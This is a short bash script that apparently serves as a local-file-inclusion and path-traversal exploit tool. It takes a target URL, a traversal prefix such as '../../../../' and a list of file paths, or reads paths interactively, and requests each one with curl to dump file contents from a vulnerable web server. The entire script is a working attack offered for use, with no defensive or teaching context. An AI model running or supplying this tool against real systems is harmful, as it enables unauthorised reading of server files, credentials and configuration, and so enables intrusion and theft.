#!/bin/bash
 
function usage {
    echo "usage: $0 [-p prefix] [-s suffix] [-f input.txt] -u URL"
    echo "eg   : $0 -p \"../../../../\" -s \"\" -u \"http://vulnsite.com/test.php?page=\""
}
 
if [[ -z $1 ]]; then
    usage
    exit 0;
fi
 
prefix=""
suffix=""
url=""
cmdfile=""
rfifile=""
 
while getopts "p:s:u:f:" OPT; do
    case $OPT in
        p) prefix=$OPTARG;;
        s) suffix=$OPTARG;;
        u) url=$OPTARG;;
        f) cmdfile=$OPTARG;;
        *) usage; exit 0;;
    esac
done
 
if [[ -z $url ]]; then
    usage
    exit 0;
fi
 
which curl &>/dev/null
if [[ $? -ne 0 ]]; then
    echo "[!] curl needs to be installed to run this script"
    exit 1
fi
 
# read files from a file and print to stdout
if [[ ! -z $cmdfile ]]; then
    if [[ -f $cmdfile ]]; then
        for i in $(cat $cmdfile); do
            echo "[+] requesting ${url}${prefix}${i}${suffix}"
            curl "${url}${prefix}${i}${suffix}"
        done
    fi
else
    # interactive shell
    while :; do
        printf "[>] "
        read cmd
        echo "[+] requesting ${url}${prefix}${cmd}${suffix}"
        curl "${url}${prefix}${cmd}${suffix}"
        echo ""
    done
fi
